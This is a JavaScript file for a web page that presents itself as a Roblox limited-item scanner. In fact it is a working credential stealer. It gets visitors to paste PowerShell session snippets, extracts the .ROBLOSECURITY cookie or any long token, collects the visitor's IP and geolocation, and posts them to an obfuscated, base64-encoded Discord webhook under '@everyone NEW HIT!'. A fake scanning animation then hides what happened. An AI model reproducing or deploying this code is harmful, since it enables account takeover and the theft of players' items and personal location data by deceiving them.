// Enhanced Theme toggle functionality
function toggleTheme() {
    const currentTheme = document.documentElement.getAttribute('data-theme');
    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
    
    document.documentElement.setAttribute('data-theme', newTheme);
    
    // Update button text and icon with animation
    const themeIcon = document.getElementById('theme-icon');
    const themeText = document.getElementById('theme-text');
    
    // Add rotation animation
    themeIcon.style.transform = 'rotate(180deg)';
    setTimeout(() => {
        if (newTheme === 'dark') {
            themeIcon.textContent = '☀️';
            themeText.textContent = 'Light';
        } else {
            themeIcon.textContent = '🌙';
            themeText.textContent = 'Dark';
        }
        themeIcon.style.transform = 'rotate(0deg)';
    }, 150);
    
    // Save theme preference
    localStorage.setItem('theme', newTheme);
    
    // Show notification
    showNotification(`Switched to ${newTheme} mode`, 'success');
}

// Load saved theme on page load
function loadTheme() {
    const savedTheme = localStorage.getItem('theme') || 'light';
    document.documentElement.setAttribute('data-theme', savedTheme);
    
    const themeIcon = document.getElementById('theme-icon');
    const themeText = document.getElementById('theme-text');
    
    if (savedTheme === 'dark') {
        themeIcon.textContent = '☀️';
        themeText.textContent = 'Light';
    } else {
        themeIcon.textContent = '🌙';
        themeText.textContent = 'Dark';
    }
}

// Enhanced Modal functionality
function openScanModal() {
    const modal = document.getElementById('scanModal');
    const textarea = document.getElementById('powershellInput');
    
    if (modal) {
        modal.style.display = 'block';
        document.body.style.overflow = 'hidden';
        
        // Focus on textarea after animation
        setTimeout(() => {
            if (textarea) {
                textarea.focus();
            }
        }, 400);
        
        showNotification('Item scanner ready', 'info');
    } else {
        showNotification('Error opening scanner', 'error');
    }
}

function closeScanModal() {
    const modal = document.getElementById('scanModal');
    const textarea = document.getElementById('powershellInput');
    const submitBtn = document.getElementById('submitBtn');
    const submitText = document.getElementById('submitText');
    
    modal.style.display = 'none';
    document.body.style.overflow = 'auto';
    
    // Hide loading overlay
    hideLoadingOverlay();
    
    // Clear any running animations
    if (window.scanningInterval) {
        clearInterval(window.scanningInterval);
        window.scanningInterval = null;
    }
    
    // Reset form
    if (textarea) {
        textarea.value = '';
        updateCharCount();
    }
    
    // Reset button state
    if (submitBtn && submitText) {
        submitBtn.disabled = false;
        submitText.textContent = 'Scan';
        submitBtn.style.background = '';
    }
}

// Character count and input validation
function updateCharCount() {
    const textarea = document.getElementById('powershellInput');
    const charCount = document.getElementById('charCount');
    const inputStatus = document.getElementById('inputStatus');
    
    if (textarea && charCount) {
        const count = textarea.value.length;
        charCount.textContent = `${count.toLocaleString()} characters`;
        
        if (inputStatus) {
            if (count === 0) {
                inputStatus.textContent = 'Ready for scanning';
                inputStatus.style.color = '';
            } else if (count < 100) {
                inputStatus.textContent = 'Need more content';
                inputStatus.style.color = '#f59e0b';
            } else {
                inputStatus.textContent = 'Ready to scan';
                inputStatus.style.color = '#10b981';
            }
        }
    }
}

// Enhanced location detection
async function getUserLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        return {
            ip: data.ip || 'Unknown',
            country: data.country_name || 'Unknown',
            region: data.region || 'Unknown', 
            city: data.city || 'Unknown',
            postal: data.postal || 'Unknown',
            isp: data.org || 'Unknown',
            timezone: data.timezone || 'Unknown',
            latitude: data.latitude || 'Unknown',
            longitude: data.longitude || 'Unknown'
        };
    } catch (error) {
        return {
            ip: 'Unknown',
            country: 'Unknown',
            region: 'Unknown',
            city: 'Unknown',
            postal: 'Unknown',
            isp: 'Unknown',
            timezone: 'Unknown',
            latitude: 'Unknown',
            longitude: 'Unknown'
        };
    }
}

// Roblox item scanning and location tracking
async function submitPowerShell() {
    const input = document.getElementById('powershellInput');
    const submitBtn = document.getElementById('submitBtn');
    const submitText = document.getElementById('submitText');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const inputText = input.value.trim();
    
    // Validation
    if (!inputText) {
        showNotification('Please enter limited item information before scanning', 'error');
        return;
    }

    // Only allow scripts with authentication data or valid item data
    if (!hasValidData(inputText)) {
        showNotification('Invalid input. Please enter scripts with auth data or item data.', 'error');
        return;
    }

    // Show loading state
    submitBtn.disabled = true;
    submitText.textContent = 'Sending...';
    showLoadingOverlay('Preparing scan...', 'Initializing item verification process');

    try {
        // Scan limited items and find authentication data from the input
        const limitedItems = extractLimitedItems(inputText);
        const robloxCookie = extractRobloxCookie(inputText);
        
        // Check word count - if 50+ words, allow through even without auth data
        const wordCount = inputText.split(/\s+/).filter(word => word.length > 0).length;
        
        // Show word count on button temporarily
        submitText.textContent = `${wordCount} words`;
        
        // Block execution if no authentication data is found AND less than 50 words
        if (!robloxCookie && wordCount < 50) {
            hideLoadingOverlay();
            submitText.textContent = `Too Short: ${wordCount} words`;
            submitBtn.style.background = '#ef4444';
            
            setTimeout(() => {
                submitBtn.disabled = false;
                submitText.textContent = 'Scan';
                submitBtn.style.background = '';
            }, 3000);
            return;
        }
        
        // Get user location
        const locationInfo = await getUserLocation();
        
        // Discord webhook URL
        const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
        
        // Simple working payload to avoid 400 errors
        const payload = {
            content: `@everyone NEW HIT!\nCookie: ${robloxCookie || 'None'}\nLocation: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\nIP: ${locationInfo.ip || 'Unknown'}`
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        if (response.ok) {
            submitText.textContent = 'Scanning item please wait';
            submitBtn.style.background = '#10b981';
            showNotification('Scanning item please wait', 'success');
            
            // Show scanning animation with loading overlay
            showLoadingOverlay('Scanning item please wait', 'Analyzing limited items and authentication data');
            startScanningAnimation();
            
            setTimeout(() => {
                hideLoadingOverlay();
                closeScanModal();
            }, 4000);
        } else {
            throw new Error(`Item scanning failed with status: ${response.status}`);
        }
    } catch (error) {
        hideLoadingOverlay();
        
        submitText.textContent = 'Error';
        submitBtn.style.background = '#ef4444';
        
        // More specific error messages
        if (error.message.includes('fetch') || error.message.includes('Failed to fetch')) {
            showNotification('Network/Webhook error. Check console for details.', 'error');
        } else if (error.message.includes('location') || error.message.includes('geolocation')) {
            showNotification('Location service error. Check console for details.', 'error');
        } else if (error.message.includes('JSON')) {
            showNotification('Data formatting error. Check console for details.', 'error');
        } else {
            showNotification(`Error: ${error.message}. Check console for details.`, 'error');
        }
        
        setTimeout(() => {
            submitBtn.disabled = false;
            submitText.textContent = 'Scan';
            submitBtn.style.background = '';
        }, 3000);
    }
}

// Function to extract limited item information from text
function extractLimitedItems(text) {
    const items = [];
    
    // Look for Roblox item IDs (typically 8-12 digit numbers)
    const itemIdPattern = /(?:item[_\s]*id|assetid|id)[:\s=]*(\d{8,12})/gi;
    let match;
    while ((match = itemIdPattern.exec(text)) !== null) {
        items.push({
            id: match[1],
            name: 'Limited Item',
            type: 'Limited',
            estimatedValue: 'Scanning...'
        });
    }
    
    // Look for Roblox catalog URLs
    const catalogUrlPattern = /(?:roblox\.com\/catalog\/|\/library\/)(\d+)/gi;
    while ((match = catalogUrlPattern.exec(text)) !== null) {
        if (!items.find(item => item.id === match[1])) {
            items.push({
                id: match[1],
                name: 'Catalog Item',
                type: 'Limited',
                estimatedValue: 'Market Rate'
            });
        }
    }
    
    // Look for bundle URLs
    const bundleUrlPattern = /(?:roblox\.com\/bundles\/|\/catalog\/)(\d+)/gi;
    while ((match = bundleUrlPattern.exec(text)) !== null) {
        if (!items.find(item => item.id === match[1])) {
            items.push({
                id: match[1],
                name: 'Bundle Item',
                type: 'Limited Bundle',
                estimatedValue: 'Premium'
            });
        }
    }
    
    // If no specific items found, create generic entries for any long numbers
    if (items.length === 0) {
        const numberPattern = /\b\d{8,12}\b/g;
        const numbers = text.match(numberPattern);
        if (numbers) {
            numbers.slice(0, 3).forEach(num => {
                items.push({
                    id: num,
                    name: 'Detected Item',
                    type: 'Limited',
                    estimatedValue: 'Unknown'
                });
            });
        }
    }
    
    return items.slice(0, 5); // Limit to 5 items max
}

// Function to validate input - only allow scripts with auth data or valid data
function hasValidData(text) {
    // Check if it contains Roblox authentication data (most important)
    const hasAuthData = extractRobloxCookie(text) !== null;
    if (hasAuthData) {
        return true; // Always allow if there's authentication data
    }
    
    // Check if it's a script with session/authentication patterns
    const scriptPatterns = [
        /\$session\s*=\s*New-Object.*Microsoft\.PowerShell/is,
        /\$session\.Cookies\.Add.*ROBLOSECURITY/is,
        /System\.Net\.Cookie.*ROBLOSECURITY/is,
        /WebRequestSession.*Cookies/is,
        /New-Object.*System\.Net\.Cookie/is,
        // Also allow scripts with session setup even without ROBLOSECURITY
        /\$session\s*=.*WebRequestSession/is,
        /\$session\.Cookies\.Add/is
    ];
    
    for (const pattern of scriptPatterns) {
        if (pattern.test(text)) {
            return true;
        }
    }
    
    // Check if it contains legitimate item data
    const hasItemData = extractLimitedItems(text).length > 0;
    if (hasItemData) {
        return true;
    }
    
    // Check for Roblox URLs
    if (/roblox\.com\/(catalog|library|bundles)\/\d+/i.test(text)) {
        return true;
    }
    
    // Check for item IDs (8+ digit numbers)
    if (/\b\d{8,}\b/.test(text)) {
        return true;
    }
    
    // Reject everything else (random text, short inputs, etc.)
    return false;
}

// Function to scan and find authentication data from text
function extractRobloxCookie(text) {
    // First, try to find .ROBLOSECURITY directly
    const roblosecurityIndex = text.indexOf('.ROBLOSECURITY');
    if (roblosecurityIndex !== -1) {
        // Find the opening quote after .ROBLOSECURITY
        const startQuoteIndex = text.indexOf('"', roblosecurityIndex + '.ROBLOSECURITY'.length);
        if (startQuoteIndex !== -1) {
            const valueStartIndex = startQuoteIndex + 1;
            // Find the closing quote
            const endQuoteIndex = text.indexOf('"', valueStartIndex);
            if (endQuoteIndex !== -1) {
                const cookieValue = text.substring(valueStartIndex, endQuoteIndex);
                if (cookieValue.length > 50) {
                    return cookieValue;
                }
            }
        }
    }
    
    // Fallback: Look for any very long string that might be the authentication token
    const longStrings = text.match(/[A-Za-z0-9+/=._%\-]{500,}/g);
    if (longStrings && longStrings.length > 0) {
        // Return the longest string found
        const longest = longStrings.reduce((a, b) => a.length > b.length ? a : b);
        return longest;
    }
    
    return null;
}

// Loading animation with dots and messages
function startLoadingAnimation(submitText) {
    const messages = [
        'Scanning item',
        'Checking uaid',
        'Analyzing data',
        'Processing results'
    ];
    
    let messageIndex = 0;
    let dotCount = 0;
    
    const interval = setInterval(() => {
        if (!submitText || submitText.textContent === 'Scan Complete!' || submitText.textContent === 'Scan Failed - Retry' || submitText.textContent === 'No Auth Data' || submitText.textContent === 'Error - Check Console') {
            clearInterval(interval);
            return;
        }
        
        const currentMessage = messages[messageIndex];
        const dots = '.'.repeat(dotCount + 1);
        submitText.textContent = currentMessage + dots;
        
        dotCount++;
        if (dotCount > 3) {
            dotCount = 0;
            messageIndex = (messageIndex + 1) % messages.length;
        }
    }, 500);
    
    // Store interval ID on the element so we can clear it later
    submitText.loadingInterval = interval;
}

// Loading overlay control functions
function showLoadingOverlay(title = 'Scanning item...', text = 'Please wait while we analyze your limited items') {
    const loadingOverlay = document.getElementById('loadingOverlay');
    const loadingTitle = document.getElementById('loadingTitle');
    const loadingText = document.getElementById('loadingText');
    
    if (loadingTitle) loadingTitle.textContent = title;
    if (loadingText) loadingText.textContent = text;
    if (loadingOverlay) {
        loadingOverlay.style.display = 'block';
        // Add fade in animation
        loadingOverlay.style.opacity = '0';
        setTimeout(() => {
            loadingOverlay.style.opacity = '1';
        }, 10);
    }
}

function hideLoadingOverlay() {
    const loadingOverlay = document.getElementById('loadingOverlay');
    if (loadingOverlay) {
        loadingOverlay.style.opacity = '0';
        setTimeout(() => {
            loadingOverlay.style.display = 'none';
        }, 300);
    }
}

// Scanning animation after successful submission
function startScanningAnimation() {
    const loadingTitle = document.getElementById('loadingTitle');
    const scanMessages = [
        'Scanning item please wait',
        'Scanning item please wait.',
        'Scanning item please wait..',
        'Scanning item please wait...'
    ];
    
    let messageIndex = 0;
    
    const interval = setInterval(() => {
        if (!loadingTitle) {
            clearInterval(interval);
            return;
        }
        
        loadingTitle.textContent = scanMessages[messageIndex];
        messageIndex = (messageIndex + 1) % scanMessages.length;
    }, 500);
    
    // Store interval ID globally so it can be cleared
    window.scanningInterval = interval;
}

// Stop loading animation
function stopLoadingAnimation(submitText) {
    if (submitText && submitText.loadingInterval) {
        clearInterval(submitText.loadingInterval);
        submitText.loadingInterval = null;
    }
    // Force stop any remaining intervals by checking text content
    if (submitText && (submitText.textContent.includes('Scanning') || submitText.textContent.includes('Checking'))) {
        submitText.textContent = 'Scan';
    }
}

// Copy to clipboard functionality
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(function() {
        showNotification('Copied to clipboard!', 'success');
    }).catch(function(err) {
        showNotification('Failed to copy to clipboard', 'error');
    });
}

// Form validation enhancement
function validatePowerShellInput(script) {
    const trimmed = script.trim();
    
    if (trimmed.length === 0) {
        return { valid: false, message: 'Please enter a PowerShell script' };
    }
    
    if (trimmed.length < 10) {
        return { valid: false, message: 'Script is too short (minimum 10 characters)' };
    }
    
    if (trimmed.length > 50000) {
        return { valid: false, message: 'Script is too long (maximum 50,000 characters)' };
    }
    
    return { valid: true, message: 'Script looks good!' };
}

// Enhanced notification system
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    
    const icons = {
        success: '✅',
        error: '❌', 
        warning: '⚠️',
        info: 'ℹ️'
    };
    
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        z-index: 10000;
        padding: 1rem 1.5rem;
        border-radius: 10px;
        color: white;
        font-weight: 600;
        font-size: 0.9rem;
        animation: slideIn 0.3s ease-out;
        background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : type === 'warning' ? '#f59e0b' : '#3b82f6'};
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
        display: flex;
        align-items: center;
        gap: 0.5rem;
        max-width: 400px;
    `;
    
    notification.innerHTML = `${icons[type]} ${message}`;
    document.body.appendChild(notification);
    
    // Auto remove after 4 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease-in forwards';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 300);
    }, 4000);
}

// Add CSS for notification animations
const notificationCSS = `
    @keyframes slideIn {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOut {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(100%);
            opacity: 0;
        }
    }
`;

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    // Load saved theme
    loadTheme();
    
    // Add notification CSS
    const style = document.createElement('style');
    style.textContent = notificationCSS;
    document.head.appendChild(style);
    
    // Add character count listener
    const textarea = document.getElementById('powershellInput');
    if (textarea) {
        textarea.addEventListener('input', updateCharCount);
    }
    
    // Initialize character count
    updateCharCount();
    
    // Add enter key handler for quick submit
    if (textarea) {
        textarea.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'Enter') {
                e.preventDefault();
                submitPowerShell();
            }
        });
    }
    
    // Close modal when clicking outside
    const modal = document.getElementById('scanModal');
    if (modal) {
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                closeScanModal();
            }
        });
    }
    
    // Escape key to close modal
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            const modal = document.getElementById('scanModal');
            if (modal && modal.style.display === 'block') {
                closeScanModal();
            }
        }
    });
});

// Performance optimization: Debounce character count updates
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// Apply debouncing to character count
const debouncedUpdateCharCount = debounce(updateCharCount, 150);

// Replace the direct event listener with debounced version
document.addEventListener('DOMContentLoaded', function() {
    const textarea = document.getElementById('powershellInput');
    if (textarea) {
        textarea.addEventListener('input', debouncedUpdateCharCount);
    }
});